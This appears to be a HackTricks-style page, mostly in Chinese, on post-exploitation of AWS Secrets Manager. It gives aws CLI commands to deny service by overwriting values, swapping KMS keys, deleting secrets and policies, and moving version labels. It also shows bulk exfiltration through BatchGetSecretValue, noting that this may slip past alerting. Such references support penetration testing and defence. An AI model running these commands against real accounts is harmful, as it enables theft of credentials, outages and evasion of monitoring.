# AWS - Secrets Manager Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## Secrets Manager

更多信息请查看：

{{#ref}}
../../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### 读取 Secrets

这些 **secrets 本身就是敏感信息**，[参见 privesc 页面](../../aws-privilege-escalation/aws-secrets-manager-privesc/README.md) 以了解如何读取它们。

### DoS 更改 Secret 值

更改 Secret 的值可能会导致 **依赖该值的所有系统被 DoS。**

> [!WARNING]
> 注意以前的值也会被存储，因此可以很容易地恢复到之前的值。
```bash
# Requires permission secretsmanager:PutSecretValue
aws secretsmanager put-secret-value \
--secret-id MyTestSecret \
--secret-string "{\"user\":\"diegor\",\"password\":\"EXAMPLE-PASSWORD\"}"
```
### DoS Change KMS key

如果攻击者拥有 secretsmanager:UpdateSecret 权限，他们可以将 secret 配置为使用由攻击者拥有的 KMS key。该密钥在初始设置时允许任何人访问和使用，因此可以使用该新密钥更新 secret。如果该密钥不可访问，则无法更新 secret。

在为 secret 更改密钥之后，攻击者修改他们的密钥配置，使只有他们自己可以访问。这样，secret 的后续版本将使用新的密钥加密，由于他人无法访问该密钥，检索 secret 的能力将丧失。

需要注意的是，这种不可访问性只会发生在后续版本，也就是 secret 内容变更之后，因为当前版本仍然使用原始 KMS key 加密。
```bash
aws secretsmanager update-secret \
--secret-id MyTestSecret \
--kms-key-id arn:aws:kms:us-west-2:123456789012:key/EXAMPLE1-90ab-cdef-fedc-ba987EXAMPLE
```
### DoS Deleting Secret

删除 secret 的最短等待天数为 7 天
```bash
aws secretsmanager delete-secret \
--secret-id MyTestSecret \
--recovery-window-in-days 7
```
## secretsmanager:RestoreSecret

可以恢复 secret，这允许恢复已被安排删除的 secret，因为 secret 的最短删除周期为 7 天，最长为 30 天。结合 secretsmanager:GetSecretValue 权限，就可以检索它们的内容。

要恢复正在被删除的 secret，你可以使用以下命令：
```bash
aws secretsmanager restore-secret \
--secret-id <Secret_Name>
```
## secretsmanager:DeleteResourcePolicy

此操作允许删除控制谁可以访问 secret 的资源策略。如果该资源策略被配置为允许特定用户集合访问，则可能导致 DoS。

要删除资源策略：
```bash
aws secretsmanager delete-resource-policy \
--secret-id <Secret_Name>
```
## secretsmanager:UpdateSecretVersionStage

secret 的状态用于管理 secret 的版本。AWSCURRENT 标记应用程序使用的活动版本，AWSPREVIOUS 保存前一个版本以便在必要时回滚，AWSPENDING 在轮换过程中用于准备和验证新版本，然后将其设为当前版本。

应用程序始终读取标记为 AWSCURRENT 的版本。如果有人将该标签移动到错误的版本，应用将使用无效的凭证并可能失败。

AWSPREVIOUS 不会被自动使用。然而，如果 AWSCURRENT 被移除或错误地重新分配，表面上可能看起来一切仍在使用前一个版本运行。
```bash
aws secretsmanager update-secret-version-stage \
--secret-id <your-secret-name-or-arn> \
--version-stage AWSCURRENT \
--move-to-version-id <target-version-id> \
--remove-from-version-id <previous-version-id>
```
{{#include ../../../../banners/hacktricks-training.md}}





### 使用 BatchGetSecretValue 批量导出 secrets（每次最多 20 个）

滥用 Secrets Manager 的 BatchGetSecretValue API，在单个请求中检索最多 20 个 secrets。与对每个 secret 逐个调用 GetSecretValue 相比，这可以显著减少 API 调用次数。如果使用 filters（tags/name），还需要 ListSecrets 权限。CloudTrail 仍会为批量中检索到的每个 secret 记录一条 GetSecretValue 事件。

Required permissions
- secretsmanager:BatchGetSecretValue
- secretsmanager:GetSecretValue（针对每个目标 secret）
- secretsmanager:ListSecrets（如果使用 --filters）
- kms:Decrypt（针对 secrets 使用的 CMKs，如果未使用 aws/secretsmanager）

> [!WARNING]
> 注意：仅拥有 `secretsmanager:BatchGetSecretValue` 权限不足以检索 secrets，您还需要为每个要检索的 secret 授予 `secretsmanager:GetSecretValue` 权限。

Exfiltrate by explicit list
```bash
aws secretsmanager batch-get-secret-value \
--secret-id-list <secret1> <secret2> <secret3> \
--query 'SecretValues[].{Name:Name,Version:VersionId,Val:SecretString}'
```
通过过滤器（按标签键/值或名称前缀）进行外传
```bash
# By tag key
aws secretsmanager batch-get-secret-value \
--filters Key=tag-key,Values=env \
--max-results 20 \
--query 'SecretValues[].{Name:Name,Val:SecretString}'

# By tag value
aws secretsmanager batch-get-secret-value \
--filters Key=tag-value,Values=prod \
--max-results 20

# By name prefix
aws secretsmanager batch-get-secret-value \
--filters Key=name,Values=MyApp
```
处理部分失败
```bash
# Inspect the Errors list for AccessDenied/NotFound and retry/adjust filters
aws secretsmanager batch-get-secret-value --secret-id-list <id1> <id2> <id3>
```
影响
- 迅速的 “smash-and-grab” 获取大量 secrets，使用更少的 API 调用，可能绕过针对 GetSecretValue 激增而调整的告警。
- CloudTrail 日志仍然会为批量检索的每个 secret 记录一条 GetSecretValue 事件。
